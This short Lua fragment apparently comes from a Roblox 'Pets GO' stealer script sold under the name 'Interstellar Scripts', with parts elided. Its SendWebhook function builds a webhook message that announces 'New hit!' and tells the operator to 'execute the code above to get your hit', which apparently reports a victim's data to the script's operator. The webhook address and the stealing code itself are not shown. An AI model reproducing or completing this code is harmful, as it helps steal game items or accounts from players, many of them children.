...
local function SendWebhook()
    local embed = {{
        ["title"] = "Interstellar Scripts | Pets GO",
        ["description"] = "Please execute the code above to get your hit.",
        ["color"] = 11220,
        ["fields"] = {
    ...
    local jsonData = game:GetService("HttpService"):JSONEncode({content = "New hit! :sunglasses:", embeds = embed})
